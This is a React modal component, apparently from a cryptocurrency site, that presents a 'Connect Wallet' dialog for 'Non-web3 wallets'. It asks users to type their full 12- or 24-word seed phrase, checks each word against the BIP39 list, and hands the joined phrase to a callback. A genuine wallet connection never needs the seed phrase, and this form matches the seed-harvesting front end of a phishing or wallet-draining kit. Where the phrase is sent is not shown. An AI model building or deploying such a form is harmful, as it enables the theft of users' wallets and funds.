'use client';

import { useState } from 'react';
import { X, ArrowLeft } from 'lucide-react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';

export default function NonWeb3WalletModal({ onClose, onConnect, onBack }) {
  const [wordCount, setWordCount] = useState(12);
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const newWords = [...seedWords];
    newWords[index] = value.toLowerCase().trim();
    setSeedWords(newWords);

    // Validate word
    const newInvalid = new Set(invalidWords);
    if (newWords[index] && !isValidBip39Word(newWords[index])) {
      newInvalid.add(index);
    } else {
      newInvalid.delete(index);
    }
    setInvalidWords(newInvalid);
  };

  const switchWordCount = (count) => {
    setWordCount(count);
    setSeedWords(Array(count).fill(''));
    setInvalidWords(new Set());
  };

  const handleConnect = () => {
    const filledWords = seedWords.filter(w => w.length > 0);
    const allValid = filledWords.length === wordCount && invalidWords.size === 0;

    if (allValid) {
      onConnect('Non-web3 wallets', seedWords.join(' '));
    }
  };

  const filledCount = seedWords.filter(w => w.length > 0).length;
  const missingCount = wordCount - filledCount;
  const isComplete = filledCount === wordCount && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 500 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          <h2 style={{ margin: 0, textAlign: 'center' }}>Non-web3 wallets</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <img src="/icons/non-web3-wallets.png" alt="Non-web3 wallets" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
            <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
              Please enter your seed phrase to continue
            </p>
          </div>

          {/* Word Count Toggle */}
          <div style={{ display: 'flex', gap: 12, justifyContent: 'center', marginBottom: 24 }}>
            <button
              onClick={() => switchWordCount(12)}
              style={{
                padding: '8px 20px',
                border: 'none',
                borderRadius: 24,
                background: wordCount === 12 ? 'var(--text)' : 'transparent',
                color: wordCount === 12 ? 'var(--bg)' : 'var(--text-dim)',
                cursor: 'pointer',
                fontWeight: 600,
                fontSize: 14,
                transition: 'all 0.2s',
              }}
            >
              12 words
            </button>
            <button
              onClick={() => switchWordCount(24)}
              style={{
                padding: '8px 20px',
                border: '1px solid rgba(255,255,255,0.2)',
                borderRadius: 24,
                background: wordCount === 24 ? 'var(--text)' : 'transparent',
                color: wordCount === 24 ? 'var(--bg)' : 'var(--text-dim)',
                cursor: 'pointer',
                fontWeight: 600,
                fontSize: 14,
                transition: 'all 0.2s',
              }}
            >
              24 words
            </button>
          </div>

          {/* Word Grid */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(3, 1fr)',
            gap: 12,
            marginBottom: 20,
            maxHeight: 400,
            overflowY: 'auto',
            paddingRight: 8,
          }}>
            {Array.from({ length: wordCount }).map((_, i) => (
              <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{i + 1}</span>
                <input
                  type="text"
                  placeholder="Word"
                  value={seedWords[i]}
                  onChange={(e) => handleWordChange(i, e.target.value)}
                  style={{
                    flex: 1,
                    padding: '6px 10px',
                    border: `1px solid ${invalidWords.has(i) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                    borderRadius: 8,
                    background: 'transparent',
                    color: 'var(--text)',
                    fontSize: 12,
                    outline: 'none',
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = invalidWords.has(i) ? '#ff4444' : 'var(--cyan)';
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = invalidWords.has(i) ? '#ff4444' : 'rgba(255,255,255,0.2)';
                  }}
                />
              </div>
            ))}
          </div>

          {/* Status */}
          <div style={{ textAlign: 'center', marginBottom: 20 }}>
            {missingCount > 0 ? (
              <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
            ) : invalidWords.size > 0 ? (
              <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
            ) : (
              <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
            )}
          </div>

          {/* Connect Button */}
          <button
            onClick={handleConnect}
            disabled={!isComplete}
            style={{
              width: '100%',
              padding: 12,
              border: 'none',
              borderRadius: 8,
              background: isComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
              color: isComplete ? 'var(--bg)' : 'var(--text-dim)',
              fontSize: 14,
              fontWeight: 600,
              cursor: isComplete ? 'pointer' : 'not-allowed',
              transition: 'all 0.2s',
            }}
            onMouseEnter={(e) => {
              if (isComplete) e.target.style.opacity = '0.9';
            }}
            onMouseLeave={(e) => {
              if (isComplete) e.target.style.opacity = '1';
            }}
          >
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );
}
